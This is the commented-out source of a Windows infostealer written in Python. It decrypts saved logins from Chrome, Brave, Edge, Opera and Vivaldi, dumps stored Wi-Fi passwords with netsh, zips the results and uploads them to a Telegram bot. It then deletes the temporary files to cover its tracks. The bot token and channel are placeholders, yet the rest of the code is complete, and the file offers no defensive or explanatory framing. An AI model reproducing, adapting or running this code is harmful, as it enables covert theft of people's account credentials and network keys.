# import os
# import json
# import base64
# import sqlite3
# import shutil
# import win32crypt
# from Crypto.Cipher import AES
# import subprocess
# import zipfile
# import tempfile
# import requests
# from datetime import datetime

# # --- CONFIGURATION ---
# TELEGRAM_BOT_TOKEN = 'TELEGRAM_TOKEN'
# TELEGRAM_CHANNEL_ID = 'TELEGRAM_ID'

# CHROMIUM_BROWSERS = {
#     "Chrome": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default",
#     "Brave": r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default",
#     "Edge": r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default",
#     "Opera": r"%APPDATA%\Opera Software\Opera Stable",
#     "Vivaldi": r"%LOCALAPPDATA%\Vivaldi\User Data\Default",
# }

# # --- TELEGRAM ---
# def send_file_to_telegram(file_path):
#     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
#     with open(file_path, 'rb') as f:
#         files = {'document': f}
#         data = {'chat_id': TELEGRAM_CHANNEL_ID}
#         return requests.post(url, files=files, data=data)

# # --- ENCRYPTION ---
# def get_encryption_key(browser_name):
#     try:
#         if browser_name == "Opera":
#             local_state_path = os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Local State")
#         else:
#             local_state_path = os.path.expandvars(
#                 os.path.join(os.path.dirname(CHROMIUM_BROWSERS[browser_name]), "Local State")
#             )
#         with open(local_state_path, "r", encoding="utf-8") as f:
#             local_state = json.load(f)
#         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
#         return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
#     except Exception:
#         return None

# def decrypt_password(encrypted_password, key):
#     try:
#         if not encrypted_password:
#             return "Empty password"
#         if encrypted_password[:3] == b'v10':
#             iv = encrypted_password[3:15]
#             payload = encrypted_password[15:-16]
#             tag = encrypted_password[-16:]
#             cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
#             return cipher.decrypt_and_verify(payload, tag).decode()
#         else:
#             return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
#     except:
#         return "Failed to decrypt"

# # --- PASSWORD EXTRACTION ---
# def extract_passwords(browser_name, profile_path, output_path):
#     login_db = os.path.join(os.path.expandvars(profile_path), "Login Data")
#     if not os.path.exists(login_db):
#         return
#     temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_LoginData_temp.db")
#     shutil.copy2(login_db, temp_db)
#     key = get_encryption_key(browser_name)
#     if not key:
#         return
#     try:
#         conn = sqlite3.connect(temp_db)
#         cursor = conn.cursor()
#         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
#         with open(output_path, 'a', encoding='utf-8') as file:
#             for origin_url, username, encrypted_password in cursor.fetchall():
#                 decrypted_password = decrypt_password(encrypted_password, key)
#                 if decrypted_password not in ("Failed to decrypt", "Empty password"):
#                     file.write(f"URL: {origin_url}\nUser: {username}\nPass: {decrypted_password}\n\n")
#         cursor.close()
#         conn.close()
#     except:
#         pass
#     finally:
#         if os.path.exists(temp_db):
#             os.remove(temp_db)

# # --- WIFI INFO ---
# def run_command_multi_encoding(command):
#     encodings = ['cp850', 'utf-8', 'latin-1']
#     for enc in encodings:
#         try:
#             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
#             stdout, _ = process.communicate()
#             output = stdout.decode(enc, errors="ignore")
#             if "Contenu de la clé" in output or "Key Content" in output:
#                 return output
#         except:
#             continue
#     return output

# def export_wifi_info(output_path):
#     profiles_raw = run_command_multi_encoding("netsh wlan show profiles")
#     profiles = []
#     for line in profiles_raw.splitlines():
#         if "Profil Tous les utilisateurs" in line or "All User Profile" in line:
#             parts = line.split(':', 1)
#             if len(parts) > 1:
#                 profiles.append(parts[1].strip())
#     wifi_info = []
#     for profile in profiles:
#         cmd = f'netsh wlan show profile name="{profile}" key=clear'
#         profile_info = run_command_multi_encoding(cmd)
#         password = "[Non trouvé]"
#         for line in profile_info.splitlines():
#             if "Contenu de la clé" in line or "Key Content" in line:
#                 parts = line.split(':', 1)
#                 if len(parts) > 1:
#                     password = parts[1].strip()
#                     break
#         wifi_info.append(f"SSID: {profile} | Password: {password}")
#     with open(output_path, 'w', encoding='utf-8') as file:
#         for line in wifi_info:
#             file.write(line + "\n")

# # --- ZIP CREATION ---
# def create_zip(wifi_path, passwords_path):
#     date_str = datetime.now().strftime("%Y-%m-%d")
#     zip_name = f"{date_str}.data.zip"
#     zip_path = os.path.join(tempfile.gettempdir(), zip_name)
#     with zipfile.ZipFile(zip_path, 'w') as zipf:
#         zipf.write(wifi_path, "wifi-info.txt")
#         zipf.write(passwords_path, "passwords-info.txt")
#     return zip_path

# # --- MAIN ---
# def main():
#     wifi_output = os.path.join(tempfile.gettempdir(), "wifi-info.txt")
#     passwords_output = os.path.join(tempfile.gettempdir(), "passwords-info.txt")

#     export_wifi_info(wifi_output)
#     for browser, path in CHROMIUM_BROWSERS.items():
#         extract_passwords(browser, path, passwords_output)

#     zip_file = create_zip(wifi_output, passwords_output)
#     send_file_to_telegram(zip_file)

#     for file in [wifi_output, passwords_output, zip_file]:
#         try:
#             os.remove(file)
#         except:
#             pass

# if __name__ == "__main__":
#     main()